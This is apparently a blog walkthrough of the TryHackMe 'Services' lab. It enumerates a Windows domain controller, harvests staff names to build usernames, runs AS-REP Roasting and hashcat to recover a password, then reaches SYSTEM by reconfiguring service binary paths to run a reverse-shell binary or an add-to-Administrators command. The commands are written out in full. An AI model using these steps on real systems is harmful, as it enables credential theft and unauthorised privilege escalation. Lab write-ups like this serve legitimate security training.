Services is a [TryHackMe](https://tryhackme.com/) room in which we find a website that exposes the full names of some team members of a fictitious company. We use these names to generate some usernames and apply a technique called [AS-REP Roasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/), which allows us to steal a password hash. With this hash, we can get initial access to the server and we see that we are part of the [Server Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators) group. This allows us to start a service which can execute a custom command that we choose. We use this gain access as the system user and gain complete access to the machine.

## Enumeration

### Nmap

We are going start by looking for open ports using [Nmap](https://nmap.org/) with the command:

```
sudo nmap -v --min-rate 10000 <Target's IP address> -p- \| grep open
```

![](2025-05-31-services-2.png)

And we have quite a few open ports. When I have more than 5 ports, I like to save them the bottom part to a file and use the below command to sort them in a manner that Nmap will accept:

```
cat tmp \| sed 's/\// /g' \| awk '{print $1}' \| tr "\n" ","
```

![](2025-05-31-services-3.png)

We can now do a full Nmap scan with the command:

```
sudo nmap -v -sVC -oN nmap.txt <Target's IP address> -p <ports>
```

![](2025-05-31-services-4.png)

We can tell that this is a Windows machine based on the following ports:

1. Port 80 is running a Microsoft IIS web server
2. Port 88 is running a Kerberos
3. Port 389 is running Active Directory LDAP which reveals the domain name of services.local
4. Port 3389 is running RDP
5. Port 5985 is running WinRM

![](2025-05-31-services-5.png)

![](2025-05-31-services-6.png)

Let get started to find a potential entry point.

### SMB - 139/445

First let us try to see if we have anonymous access to any SMB share with the command:

```
smbclient -L //<Target's IP address>/ 

	OR

smbmap -u 'anonymous' -H //<Target's IP address>
```

### HTTP - 80

And we don‚Äôt, so the next best thing to check out the website.

![](2025-05-31-services-8.png)

It is a pretty basic website with not a lot going on. The only interesting thing is in the About Us page that showcases the full names of some the company‚Äôs employee:

![](2025-05-31-services-9.png)

Another thing to notice is at the bottom of the same page, there is an email to `j.doe@services.local` which closely resembles the name of Joanne Doe from Sales

![](2025-05-31-services-10.png)

I am going to create the usernames based of the remaining team members following the same format and save them to a file:

1. j.rock for Joanne Doe
2. j.rock for Jack Rock
3. w.masters for Will Masters
4. j.larusso for Johnny LaRusso

![](2025-05-31-services-11.png)

### Kerberos - 88

Then I am going to use the tool [Kerbrute](https://github.com/ropnop/kerbrute) to see if they are valid usernames with the command:

```
./kerbrute userenum --dc <Target's IP address> -d services.local <username file>
```

And they are all valid usernames.

![](2025-05-31-services-12.png)

## Exploitation

### Abusing Kerberos

Since we don‚Äôt have a password, but we have valid usernames, we can attempt an attack called [AS-REP Roasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/). This attacks checks for users that have Kerberos pre-authentication disabled and captures the password hash. We can use [Impacket‚Äôs GetNPUsers](https://github.com/fortra/impacket) to perform this attack with the command:

```
GetNPUsers.py -dc-ip <Target's IP address> -request 'services.local/' -usersfile <username file> -format hashcat
```

![](2025-05-31-services-13.png)

And we got a hash! We can crack it using Hashcat with the command:

```
hashcat -m 18200 <hash file> rockyou.txt
```

![](2025-05-31-services-14.png)

And it just takes a few seconds:

![](2025-05-31-services-15.png)

Let‚Äôs see if we have WinRM access using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) with the command:

```
evil-winrm -i <Target's IP address> -u j.rock -p Serviceworks1
```

![](2025-05-31-services-16.png)

Let us see what else we can find!

## Post Exploitation

We can check if our user has any interesting privileges or is part of any interesting groups with the command:

```
whoami /all
```

![](2025-05-31-services-17.png)

The one group that stands out is the Server Operators group which according to [this article](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/) we can use to start and stop services in order to achieve SYSTEM privileges.

As Members of this group have the ability to start and stop services. This is a big clue as to what path this privilege escalation is going to take.

From my experience, one reason we would need to stop and start a service is after we modify that services binary path. The binary path of a service is the executable (or command) that it will run when the service starts. If we can modify a services binary path we can have it execute a malicious payload or command of our choosing. Let‚Äôs see if this will work.

I started by running the `sc query` command to see what services we could possibly target.

![](2025-05-31-services-18.png)

Welp, that‚Äôs not going to work. It looks like we don‚Äôt have the permissions necessary to query the Service Control Manager (SCM).

**NOTE:** The reason we had to use `cmd.exe /c` here is because we are running in a PowerShell session and the `sc` command is only available from a command prompt.

We also attempt the Get-Service command without success:

![](2025-05-31-services-19.png)

Again, we don‚Äôt have the right privileges to run this.

Luckily for us, evil-winrm has a built in command called `services` that we can run to show us available services and whether or not our account has the required privileges to access them:

![](2025-05-31-services-20.png)

from here we can we can escalate our privileges using 2 methods from same path.

### Method 1

I am going to choose the cfn-hup service and set the PATH of execution, but first, let us build our payload. I am going to use [this repo](https://github.com/dev-frog/C-Reverse-Shell) to build my reverse shell binary:

![](2025-05-31-services-21.png)

![](2025-05-31-services-22.png)

The reason why I am choosing the cfn-hup service is because the other services will give us a Access Denied if we try to configure the path of execution:

![](2025-05-31-services-23.png)

We can upload out payload using the built-in upload module of Evil-WinRM

![](2025-05-31-services-24.png)

And we can set the path of execution with the command:

```
sc.exe config cfn-hup binpath="C:\Users\j.rock\Documents\re.exe"
```

and then restart the service with the command sc.exe start cfn-hup

![](2025-05-31-services-25.png)

And we can catch our reverse shell as the SYSTEM user:

![](2025-05-31-services-26.png)

And we own the machine üòÅ

### Method 2

Based on the services output, let‚Äôs see if we can modify the binary path of the first service in the list (ADWS). Our goal will be to add j.rock to the Administrators group so we can grab the root flag. If we can successfully run the first command, we‚Äôll follow that up by stopping and starting the service (remember, the command won‚Äôt run until the service is restarted).

```
cmd.exe /c sc config ADWS binPATH="net localgroup Administrators j.rock /add"  
cmd.exe /c sc stop ADWS
cmd.exe /c sc start ADWS
```

Success! We‚Äôll log out and log back in as j.rock and verify our new group membership:

![](2025-05-31-services-27.png)

We‚Äôre now part of the Administrators group!

Now we can wrap this up by grabbing the root flag‚Ä¶or at least that‚Äôs what I thought. It turns out that even though j.rock is now part of the admin group, that user has no access to the root.txt file (note the ‚ÄúN‚Äù next to j.rock, meaning no permissions):

![](2025-05-31-services-28.png)

icacls confirming our user has no access to root.txt

Now there‚Äôs a couple of ways we could get around this. One would be to change the password of the Administrator account (or possibly dump their hash and crack it) and then log in as that account to read the file (because we can see they do have full access to that file). But I wanted to go another route.

Now that we are an admin, we can use a tool called impacket-psexec that will give us Local System privs on this box (which we can see also has full control over root.txt). If you want to understand more about how psexec is able to do this, I‚Äôd encourage you to [read this article](https://medium.com/@boxalarm/why-your-shell-doesnt-have-the-privileges-you-expect-diving-into-uac-and-integrity-levels-f58038e08dda) (the part about psexec is towards the bottom).

Getting SYSTEM privs through psexec

And we‚Äôre done!
